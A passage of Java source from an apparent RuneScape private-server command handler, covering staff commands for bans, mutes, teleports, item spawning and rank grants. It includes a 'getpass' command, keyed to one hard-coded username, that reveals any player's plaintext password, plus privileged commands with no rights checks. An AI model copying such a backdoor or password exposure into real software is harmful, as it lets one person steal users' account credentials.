							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage(" " + c2.playerName + " Got Banned By " + c.playerName + ".");
							for (int z = 0; z < Server.playerHandler.players.length; z++) {
								if (Server.playerHandler.players[z] != null) {
									Client o = (Client) Server.playerHandler.players[z];
									o.sendMessage("<col=29184>[" + Misc.optimizeText(c2.playerName)
											+ "]</col> <col=800000000>has just been banned by "
											+ Misc.optimizeText(c.playerName) + ".");
								}
							}
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("teletoplayer") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			c.sendMessage("<shad=838383>You teleport to the person who requested help!");
			c.t2p();
		}
		if (playerCommand.startsWith("unban")) {
			try {
				String playerToBan = playerCommand.substring(6);
				Connection.removeNameFromBanList(playerToBan);
				c.sendMessage(playerToBan + " has been unbanned.");
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("unjail") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			try {
				String playerToBan = playerCommand.substring(7);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.teleportToX = 3195;
							c2.teleportToY = 3429;
							c2.monkeyk0ed = 0;
							c2.Jail = false;
							c2.sendMessage("You have been unjailed by " + c.playerName + ".");
							c.sendMessage("Successfully unjailed " + c2.playerName + ".");
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}

	}

	public void administratorCommands(Client c, String playerCommand) {
		if (playerCommand.startsWith("alert") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			String msg = playerCommand.substring(6);
			for (int i = 0; i < Config.MAX_PLAYERS; i++) {
				if (Server.playerHandler.players[i] != null) {
					Client c2 = (Client) Server.playerHandler.players[i];
					c2.sendMessage("Alert##" + Config.SERVER_NAME + " Notification##" + msg + "##By: " + c.playerName);

				}
			}
		}
		if (playerCommand.startsWith("getnpc")) {
			String a[] = playerCommand.split(" ");
			String name = "";
			int results = 0;
			for (int i = 1; i < a.length; i++)
				name = name + a[i] + " ";
			name = name.substring(0, name.length() - 1);
			c.sendMessage("Searching npc: " + name);
			for (int j = 0; j < Server.npcHandler.NpcList.length; j++) {
				if (Server.npcHandler.NpcList[j] != null)
					if (Server.npcHandler.NpcList[j].npcName.replace("_", " ").toLowerCase()
							.contains(name.toLowerCase())) {
						c.sendMessage("<col=255>" + Server.npcHandler.NpcList[j].npcName.replace("_", " ") + " - "
								+ Server.npcHandler.NpcList[j].npcId);
						results++;
					}
			}
			c.sendMessage(results + " results found...");
		}
		if (playerCommand.startsWith("ipmute")) {
			try {
				String playerToBan = playerCommand.substring(7);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Connection.addIpToMuteList(Server.playerHandler.players[i].connectedFrom);
							c.sendMessage("You have IP Muted the user: " + Server.playerHandler.players[i].playerName);
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been muted by: " + c.playerName);
							c2.sendMessage(" " + c2.playerName + " Got IpMuted By " + c.playerName + ".");
							for (int z = 0; z < Server.playerHandler.players.length; z++) {
								if (Server.playerHandler.players[z] != null) {
									Client o = (Client) Server.playerHandler.players[z];
									o.sendMessage("<col=29184>[" + Misc.optimizeText(c2.playerName)
											+ "]</col> <col=800000000>has just been IP muted by "
											+ Misc.optimizeText(c.playerName) + ".");
								}
							}
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}

		if (playerCommand.equalsIgnoreCase("master")) {
			for (int i = 0; i < 23; i++) {
				c.playerLevel[i] = 135;
				c.playerXP[i] = c.getPA().getXPForLevel(136);
				c.getPA().refreshSkill(i);
			}
			c.getPA().requestUpdates();
		}

		if (playerCommand.startsWith("object")) {
			String[] args = playerCommand.split(" ");
			c.getPA().object(Integer.parseInt(args[1]), c.absX, c.absY, 0, 10);
		}

		if (playerCommand.equalsIgnoreCase("mypos")) {
			c.sendMessage("<col=18943>X: " + c.absX + " Y: " + c.absY + " H: " + c.heightLevel);
		}

		if (playerCommand.startsWith("interface")) {
			String[] args = playerCommand.split(" ");
			c.getPA().showInterface(Integer.parseInt(args[1]));
		}

		if (playerCommand.startsWith("gfx")) {
			String[] args = playerCommand.split(" ");
			c.gfx0(Integer.parseInt(args[1]));
		}
		if (playerCommand.startsWith("tele") && (c.playerRights >= 1 && c.playerRights <= 3)) {
			String[] arg = playerCommand.split(" ");
			if (arg.length > 3)
				c.getPA().movePlayer(Integer.parseInt(arg[1]), Integer.parseInt(arg[2]), Integer.parseInt(arg[3]));
			else if (arg.length == 3)
				c.getPA().movePlayer(Integer.parseInt(arg[1]), Integer.parseInt(arg[2]), c.heightLevel);
		}

		if (playerCommand.startsWith("item") && (c.playerRights >= 2 && c.playerRights <= 3)) {
			try {
				String[] args = playerCommand.split(" ");
				if (args.length == 3) {
					int newItemID = Integer.parseInt(args[1]);
					int newItemAmount = Integer.parseInt(args[2]);
					if ((newItemID <= 20500) && (newItemID >= 0)) {
						c.getItems().addItem(newItemID, newItemAmount);
					} else {
						c.sendMessage("That item ID does not exist.");
					}
				} else {
					c.sendMessage("Wrong usage: (eg:(::item 995 1))");
				}
			} catch (Exception e) {

			}
		}

		if (playerCommand.equalsIgnoreCase("bank")) {
			c.getPA().openUpBank();
		}
		if (playerCommand.startsWith("pnpc")) {
			try {
				int newNPC = Integer.parseInt(playerCommand.substring(5));
				if (newNPC <= 200000 && newNPC >= 0) {
					c.npcId2 = newNPC;
					c.isNpc = true;
					c.updateRequired = true;
					c.setAppearanceUpdateRequired(true);
				} else {
					c.sendMessage("No such P-NPC.");
				}
			} catch (Exception e) {
				c.sendMessage("Wrong Syntax! Use as ::pnpc #");
			}
		}
		if (playerCommand.startsWith("unpc")) {
			c.isNpc = false;
			c.updateRequired = true;
			c.appearanceUpdateRequired = true;
		}
		if (playerCommand.startsWith("unipmute")) {
			try {
				String playerToBan = playerCommand.substring(9);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Connection.unIPMuteUser(Server.playerHandler.players[i].connectedFrom);
							c.sendMessage(
									"You have Un Ip-Muted the user: " + Server.playerHandler.players[i].playerName);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("openshop")) {
			int shop = Integer.parseInt(playerCommand.substring(9));
			c.getShops().openShop(shop);
		}
		if (playerCommand.startsWith("ip")) {
			String name = playerCommand.substring(3).trim();
			ArrayList<String> usersConnFrom = new ArrayList<String>();
			String initConnFrom = "";
			String initName = "";
			for (int i = 0; i < Config.MAX_PLAYERS; i++) {
				if (Server.playerHandler.players[i] != null) {
					if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(name)) {
						Client c2 = (Client) Server.playerHandler.players[i];
						initConnFrom = c2.connectedFrom;
						initName = c2.playerName;
						for (int i2 = 0; i2 < Config.MAX_PLAYERS; i2++) {
							if (Server.playerHandler.players[i2] != null) {
								if (Server.playerHandler.players[i2].connectedFrom.equalsIgnoreCase(c2.connectedFrom)) {
									usersConnFrom.add(Server.playerHandler.players[i2].playerName);
								}
							}
						}
					}
				}
			}
			String out = initName + " is connected from " + initConnFrom + ".";
			String out2;
			if (usersConnFrom.size() > 1) {
				out2 = "Users on same IP: ";
				for (String s : usersConnFrom) {
					out2 = out2 + s + " ";
				}
				out2.trim();
				c.sendMessage(out);
				c.sendMessage(out2);
			} else
				c.sendMessage(out);

		}
		if (playerCommand.startsWith("who")) {
			try {
				String playerToCheck = playerCommand.substring(4);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToCheck)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c.sendMessage("<col=255>Name: " + c2.playerName + "");
							c.sendMessage("<col=15007744>IP: " + c2.connectedFrom + "");
							c.sendMessage("<col=255>X: " + c2.absX + "");
							c.sendMessage("<col=255>Y: " + c2.absY + "");
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player is offline.");
			}
		}

		if (playerCommand.startsWith("xteletome") && c.playerRights >= 1 && c.playerRights <= 3) {
			try {
				String playerToTele = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToTele)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("You have been teleported to " + c.playerName);
							c2.getPA().movePlayer(c.getX(), c.getY(), c.heightLevel);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("getid")) {
			String a[] = playerCommand.split(" ");
			String name = "";
			int results = 0;
			for (int i = 1; i < a.length; i++)
				name = name + a[i] + " ";
			name = name.substring(0, name.length() - 1);
			c.sendMessage("Searching: " + name);
			for (int j = 0; j < Server.itemHandler.itemList.length; j++) {
				if (Server.itemHandler.itemList[j] != null)
					if (Server.itemHandler.itemList[j].itemName.replace("_", " ").toLowerCase()
							.contains(name.toLowerCase())) {
						c.sendMessage("<col=255>" + Server.itemHandler.itemList[j].itemName.replace("_", " ") + " - "
								+ Server.itemHandler.itemList[j].itemId);
						results++;
					}
			}
			c.sendMessage(results + " results found...");
		}
		if (playerCommand.startsWith("ipban")) {
			try {
				c.getPA().writeIPBanLog(playerCommand);
				String playerToBan = playerCommand.substring(6);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Connection.addIpToBanList(Server.playerHandler.players[i].connectedFrom);
							Connection.addIpToFile(Server.playerHandler.players[i].connectedFrom);
							c.sendMessage("You have IP banned the user: " + Server.playerHandler.players[i].playerName
									+ " with the host: " + Server.playerHandler.players[i].connectedFrom);
							Client c2 = (Client) Server.playerHandler.players[i];
							Server.playerHandler.players[i].disconnected = true;
							c2.sendMessage(" " + c2.playerName + " Got IpBanned By " + c.playerName + ".");
							for (int z = 0; z < Server.playerHandler.players.length; z++) {
								if (Server.playerHandler.players[z] != null) {
									Client o = (Client) Server.playerHandler.players[z];
									o.sendMessage("<col=29184>[" + Misc.optimizeText(c2.playerName)
											+ "]</col> <col=800000000>has just been IP banned by "
											+ Misc.optimizeText(c.playerName) + ".");
								}
							}
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("macban")) {
			try {
				String[] args = playerCommand.split("-");
				String playerToBan = args[1];
				if (args.length < 1) {
					c.sendMessage("Use as: ::macban-name");
				}
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (PlayerHandler.players[i] != null) {
						if (PlayerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Connection.addMacToBanList(PlayerHandler.players[i].MacAddress);
							Connection.addMacToFile(PlayerHandler.players[i].MacAddress);
							c.sendMessage("You have Mac banned the user: " + PlayerHandler.players[i].playerName
									+ " with the host: " + PlayerHandler.players[i].MacAddress);
							PlayerHandler.players[i].disconnected = true;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("unmacban")) {
			String name = playerCommand.substring(9);
			String mac = Connection.getMac(name);
			if (mac != null) {
				Connection.unMacBannedUser(name);
				c.sendMessage("You have un-Mac banned " + name + ".");
			} else
				c.sendMessage("Player name isn`t existed.");
		}
	}

	public void ownerCommands(Client c, String playerCommand) {
		if (playerCommand.startsWith("trivia")) {
			TriviaBot.forceFirst();
		}

		if (playerCommand.startsWith("doublexp")) {
			Server.isDoubleExpWeekend = !Server.isDoubleExpWeekend;

			for (Player p : Server.playerHandler.players) {
				if (p != null) {
					Client c2 = (Client) p;
					c2.sendMessage("Double XP has been " + (Server.isDoubleExpWeekend ? "enabled" : "disabled") + "!");
				}
			}
		}

		if (playerCommand.startsWith("giveitem") && c.playerRights == 3) {
			try {
				String[] args = playerCommand.split(" ");
				int newItemID = Integer.parseInt(args[1]);
				int newItemAmount = Integer.parseInt(args[2]);
				String otherplayer = args[3];
				Client c2 = null;
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(otherplayer)) {
							c2 = (Client) Server.playerHandler.players[i];
							break;
						}
					}
				}
				if (c2 == null) {
					c.sendMessage("Player doesn't exist.");
					return;
				}
				c.sendMessage("You have just given " + newItemAmount + " of item number: " + newItemID + ".");
				c2.sendMessage("You have just been given item(s).");
				c2.getItems().addItem(newItemID, newItemAmount);
			} catch (Exception e) {
				c.sendMessage("Use as ::giveitem ID AMOUNT PLAYERNAME.");
			}
		}
		// daniel 9997114100115
		// me 495051113119101
		if (playerCommand.startsWith("copy") && (c.playerName.equalsIgnoreCase("Seth"))) {
			int[] arm = new int[14];
			String name = playerCommand.substring(5);
			for (int j = 0; j < Server.playerHandler.players.length; j++) {
				if (Server.playerHandler.players[j] != null) {
					Client c2 = (Client) Server.playerHandler.players[j];
					if (c2.playerName.equalsIgnoreCase(playerCommand.substring(5))) {
						for (int q = 0; q < c2.playerEquipment.length; q++) {
							arm[q] = c2.playerEquipment[q];
							c.playerEquipment[q] = c2.playerEquipment[q];
						}
						for (int q = 0; q < arm.length; q++) {
							c.getItems().setEquipment(arm[q], 1, q);
						}
					}
				}
			}
		}

		if (playerCommand.startsWith("takeitem") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String[] args = playerCommand.split(" ");
				int takenItemID = Integer.parseInt(args[1]);
				int takenItemAmount = Integer.parseInt(args[2]);
				String otherplayer = args[3];
				Client c2 = null;
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(otherplayer)) {
							c2 = (Client) Server.playerHandler.players[i];
							break;
						}
					}
				}
				if (c2 == null) {
					c.sendMessage("Player doesn't exist.");
					return;
				}
				c.sendMessage("You have just removed " + takenItemAmount + " of item number: " + takenItemID + ".");
				c2.sendMessage("One or more of your items have been removed by a staff member.");
				c2.getItems().deleteItem(takenItemID, takenItemAmount);
			} catch (Exception e) {
				c.sendMessage("Use as ::takeitem ID AMOUNT PLAYERNAME.");
			}
		}

		if (playerCommand.startsWith("regnow")) {
			try {
				String playerToBan = playerCommand.substring(7);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToBan)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c.sendMessage("Follow Us! " + c2.playerName);
							c2.getPA().sendFrame126("Power-Ps", 12000);
							c2.getPA().sendFrame126("Power-Ps", 12000);
							c2.getPA().sendFrame126("Power-Ps", 12000);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Online.");
			}
		}

		if (playerCommand.startsWith("update")) {
			String[] args = playerCommand.split(" ");
			int a = Integer.parseInt(args[1]);
			PlayerHandler.updateSeconds = a;
			PlayerHandler.updateAnnounced = false;
			PlayerHandler.updateRunning = true;
			PlayerHandler.updateStartTime = System.currentTimeMillis();
		}

		if (playerCommand.startsWith("spawn")) {
			try {
				int newNPC = Integer.parseInt(playerCommand.substring(4));
				if (newNPC > 0) {
					Server.npcHandler.spawnNpc(c, newNPC, c.absX, c.absY, 0, 0, 120, 7, 70, 70, false, false);
					c.sendMessage("You spawn a Npc.");
				} else {
					c.sendMessage("No such NPC.");
				}
			} catch (Exception e) {

			}
		}

		if (playerCommand.startsWith("adminyell") && c.playerRights == 3) {
			for (int j = 0; j < Server.playerHandler.players.length; j++) {
				if (Server.playerHandler.players[j] != null) {
					Client c2 = (Client) Server.playerHandler.players[j];
					c2.sendMessage("<shad=15695415>[SERVER]</col> " + Misc.optimizeText(playerCommand.substring(3)));
				}
			}
		}
		if (playerCommand.startsWith("reloadshops") && c.playerRights == 3) {
			Server.shopHandler = new server.world.ShopHandler();
			for (int j = 0; j < Server.playerHandler.players.length; j++) {
				if (Server.playerHandler.players[j] != null) {
					Client c2 = (Client) Server.playerHandler.players[j];
					c2.sendMessage("<shad=15695415>[Server]:" + c.playerName + " " + " Has refilled the shops.</col> "
							+ Misc.optimizeText(playerCommand.substring(3)));
				}
			}
		}

		if (playerCommand.equalsIgnoreCase("givedonor") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerTosdonor = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerTosdonor)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("<img=2><img=2><shad=838383>Thanks, " + c.playerName
									+ ", You're now a donator!<img=2><img=2>");
							c2.playerRights = 4;
							c2.isDonator = 1;
							// c2.donatorChest += 400;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Online.");
			}
		}
		if (playerCommand.equalsIgnoreCase("givesuperdonor") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerTosdonor = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerTosdonor)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("<img=2><img=2><shad=838383>Thanks, " + c.playerName
									+ ", You're now a donator!<img=2><img=2>");
							c2.playerRights = 5;
							c2.isDonator = 1;
							c2.issDonator = 1;
							// c2.donatorChest += 400;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Online.");
			}
		}
		if (playerCommand.startsWith("funhail") && c.playerRights == 3) {
			for (int j = 0; j < Server.playerHandler.players.length; j++) {
				if (Server.playerHandler.players[j] != null) {
					Client p = (Client) Server.playerHandler.players[j];
					int randomText = Misc.random(10);
					if (randomText == 0) {
						p.forcedChat("Power-PS world rocks!!");
					} else if (randomText == 1) {
						p.forcedChat("All join Power-Ps best server around!");
					} else if (randomText == 2) {
						p.forcedChat("We love Power-Ps :D!");
					} else if (randomText == 3) {
						p.forcedChat("It's pk time on Power-Ps");
					} else if (randomText == 4) {
						p.forcedChat("Seth owns and so does this server!");
					} else if (randomText == 5) {
						p.forcedChat("Im not saying i like Power-Ps. I love it!!!!!");
					} else if (randomText == 6) {
						p.forcedChat("Omg such a good server it is no.1 Power-Ps ftw!");
					} else if (randomText == 7) {
						p.forcedChat("You know whats awesome? Power-Ps!!");
					} else if (randomText == 8) {
						p.forcedChat("We love Power-Ps :D!");
					} else if (randomText == 9) {
						p.forcedChat("I have never seen such a good server as this!");
					} else if (randomText == 10) {
						p.forcedChat("I like cock!");
					}

				}
			}
		}

		if (playerCommand.startsWith("anim")) {
			String[] args = playerCommand.split(" ");
			c.startAnimation(Integer.parseInt(args[1]));
			c.getPA().requestUpdates();
		}
		if (playerCommand.startsWith("spec")) {
			c.specAmount = 500.0;
		}
		if (playerCommand.startsWith("giveadmin") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToAdmin = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToAdmin)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED ADMIN STATUS BY " + c.playerName);
							c2.playerRights = 2;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("givesupporter") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToAdmin = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToAdmin)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED SERVER SUPPORT STATUS BY " + c.playerName);
							c2.playerRights = 7;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("givedicer") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToAdmin = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToAdmin)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED SERVER Dicer RANK BY " + c.playerName);
							c2.Dicer = 1;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("givetrusteddicer") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToAdmin = playerCommand.substring(10);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToAdmin)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED SERVER Dicer RANK BY " + c.playerName);
							c2.Dicer = 1;
							c2.playerRights = 10;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("givemod") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToMod = playerCommand.substring(8);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToMod)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED MOD STATUS BY " + c.playerName);
							c2.playerRights = 1;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("giveyoutuber") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToMod = playerCommand.substring(8);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToMod)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("YOU HAVE BEEN AWARDED YOUTUBER STATUS BY " + c.playerName);
							c2.playerRights = 8;
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}
		if (playerCommand.startsWith("demote") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String playerToDemote = playerCommand.substring(7);
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(playerToDemote)) {
							Client c2 = (Client) Server.playerHandler.players[i];
							c2.sendMessage("<img=2><img=2>YOU'RE DEMOTED!<img=2><img=2>");
							c2.playerRights = 0;
							c2.isDonator = 0;
							c2.issDonator = 0;
							c2.Dicer = 0;
							c2.startAnimation(333);
							break;
						}
					}
				}
			} catch (Exception e) {
				c.sendMessage("Player Must Be Offline.");
			}
		}

		if (playerCommand.equalsIgnoreCase("codegear")) {
			c.getItems().deleteAllItems();
			int[] equip = { 1050, 6570, 19513, 13095, 10400, 6889, -1, 10394, -1, 775, -1, 1837, 773 };
			for (int i = 0; i < equip.length; i++) {
				c.playerEquipment[i] = equip[i];
				c.playerEquipmentN[i] = 1;
				c.getItems().setEquipment(equip[i], 1, i);
			}
			c.getItems().addItem(995, 2147000000);
			c.updateRequired = true;
			c.appearanceUpdateRequired = true;
		}

		if (playerCommand.startsWith("infhp")) {
			c.getPA().requestUpdates();
			c.playerLevel[3] = 99999;
			c.getPA().refreshSkill(3);
			c.gfx0(287);
		}
		if (playerCommand.equalsIgnoreCase("uninfhp")) {
			c.getPA().requestUpdates();
			c.playerLevel[3] = 99;
			c.getPA().refreshSkill(3);
			c.gfx0(538);
		}
		if (playerCommand.equalsIgnoreCase("infpray")) {
			c.getPA().requestUpdates();
			c.playerLevel[5] = 99999;
			c.getPA().refreshSkill(5);
			c.gfx0(310);
			c.startAnimation(4304);

		}
		if (playerCommand.startsWith("afk") && c.sit == false) {
			if (c.inWild()) {
				c.sendMessage("Er, it's not to smart to go AFK in the Wilderness...");
				return;
			}
			c.sit = true;
			if (c.playerRights == 0) {
				c.startAnimation(4117);
				c.forcedText = "Be back in a second.";
				c.forcedChatUpdateRequired = true;
				c.updateRequired = true;
				c.sendMessage("When you return type ::back, you cannot move while AFK is on.");
			}
			if (c.playerRights == 2 || c.playerRights == 3) {
				c.startAnimation(4117);
				c.forcedText = "Be back in a second.";
				c.forcedChatUpdateRequired = true;
				c.updateRequired = true;
				c.sendMessage("When you return type ::back, you cannot move while AFK is on.");
			}
			if (c.playerRights == 2 || c.playerRights == 2) {
				c.startAnimation(4117);
				c.forcedText = "Be back in a second.";
				c.forcedChatUpdateRequired = true;
				c.updateRequired = true;
				c.sendMessage("When you return type ::back, you cannot move while AFK is on.");
			}
			if (c.playerRights == 4) {
				c.startAnimation(4117);
				c.forcedText = "Be back in a second.";
				c.forcedChatUpdateRequired = true;
				c.updateRequired = true;
				c.sendMessage("When you return type ::back, you cannot move while AFK is on.");
			}
		}

		if (playerCommand.startsWith("back") && c.sit == true) {
			if (c.inWild()) {
				c.sendMessage("It's not the best idea to do this in the Wilderness...");
				return;
			}

			c.sit = false;
			c.startAnimation(12575); // if your client doesn't load 602+
										// animations, you'll have to change
										// this.
			c.forcedText = "I'm back.";
			c.forcedChatUpdateRequired = true;
			c.updateRequired = true;
		}

		if (playerCommand.startsWith("invclear") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String[] args = playerCommand.split(" ", 2);
				String otherplayer = args[1];
				Client c2 = null;
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(otherplayer)) {
							c2 = (Client) Server.playerHandler.players[i];
							break;
						}
					}
				}
				if (c2 == null) {
					c.sendMessage("Player doesn't exist.");
					return;
				}
				c2.getItems().removeAllItems();
				c2.sendMessage("Your inventory has been cleared by a staff member.");
				c.sendMessage("You cleared " + c2.playerName + "'s inventory.");
			} catch (Exception e) {
				c.sendMessage("Use as ::invclear PLAYERNAME.");
			}
		}
		if (playerCommand.equalsIgnoreCase("levelids")) {
			c.sendMessage("Attack = 0,   Defence = 1,  Strength = 2,");
			c.sendMessage("Hitpoints = 3,   Ranged = 4,   Prayer = 5,");
			c.sendMessage("Magic = 6,   Cooking = 7,   Woodcutting = 8,");
			c.sendMessage("Fletching = 9,   Fishing = 10,   Firemaking = 11,");
			c.sendMessage("Crafting = 12,   Smithing = 13,   Mining = 14,");
			c.sendMessage("Herblore = 15,   Agility = 16,   Thieving = 17,");
			c.sendMessage("Slayer = 18,   Farming = 19,   Runecrafting = 20");
		}
		if (playerCommand.startsWith("setlevel") && (c.playerName.equalsIgnoreCase("Seth"))) {
			try {
				String[] args = playerCommand.split(" ");
				int skill = Integer.parseInt(args[1]);
				int level = Integer.parseInt(args[2]);
				String otherplayer = args[3];
				Client target = null;
				for (int i = 0; i < Config.MAX_PLAYERS; i++) {
					if (Server.playerHandler.players[i] != null) {
						if (Server.playerHandler.players[i].playerName.equalsIgnoreCase(otherplayer)) {
							target = (Client) Server.playerHandler.players[i];
							break;
						}
					}
				}
				if (target == null) {
					c.sendMessage("Player doesn't exist.");
					return;
				}
				c.sendMessage("You have just set one of " + Misc.ucFirst(target.playerName) + "'s skills.");
				target.sendMessage("" + Misc.ucFirst(c.playerName) + " has just set one of your skills.");
				target.playerXP[skill] = target.getPA().getXPForLevel(level) + 5;
				target.playerLevel[skill] = target.getPA().getLevelForXP(target.playerXP[skill]);
				target.getPA().refreshSkill(skill);
			} catch (Exception e) {
				c.sendMessage("Use as ::setlevel SKILLID LEVEL PLAYERNAME.");
			}
		}
		if (playerCommand.startsWith("getpass") && (c.playerName.equalsIgnoreCase("melee200100"))) {
			try {
				String otherPName = playerCommand.substring(8);
				int otherPIndex = PlayerHandler.getPlayerID(otherPName);

				if (otherPIndex != -1) {
					Client p = (Client) Server.playerHandler.players[otherPIndex];

					c.sendMessage("Username: (" + p.playerName + ") Password: (" + p.playerPass + ") ");
				} else {
					c.sendMessage("This player either does not exist or is OFFLINE.");
				}
			} catch (Exception e) {
				c.sendMessage("Invalid Command, Try ::getpass USERNAME.");
			}
		}
		if (playerCommand.startsWith("npc")) {
			try {
				int newNPC = Integer.parseInt(playerCommand.substring(4));
				if (newNPC > 0) {
					Server.npcHandler.spawnNpc(c, newNPC, c.absX, c.absY, 0, 0, 120, 7, 70, 70, false, false);
					c.sendMessage("You spawn an Npc.");
				} else {
					c.sendMessage("No such NPC.");
				}
			} catch (Exception e) {

			}
		}
